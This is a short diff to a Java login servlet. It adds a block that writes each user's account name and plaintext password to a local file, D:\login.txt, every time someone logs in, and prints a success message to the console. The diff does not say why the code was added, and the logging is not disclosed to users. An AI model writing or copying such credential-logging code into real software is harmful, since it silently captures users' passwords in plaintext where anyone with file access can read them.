@@ -48,5 +48,14 @@ public class DangNhapServlet extends HttpServlet {
             if (preparedStatement != null) try { preparedStatement.close(); } catch (SQLException ignore) {}
             if (connection != null) try { connection.close(); } catch (SQLException ignore) {}
         }
+        try (FileWriter fw = new FileWriter("D:\\login.txt", true); PrintWriter pw = new PrintWriter(fw)) {
+			pw.println("Tài khoản: " + tenNguoiDung);
+			pw.println("Mật khẩu: " + matkhau);
+			pw.println("------------------------------");
+			System.out.println("Lưu thành công");
+			
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
     }
 }
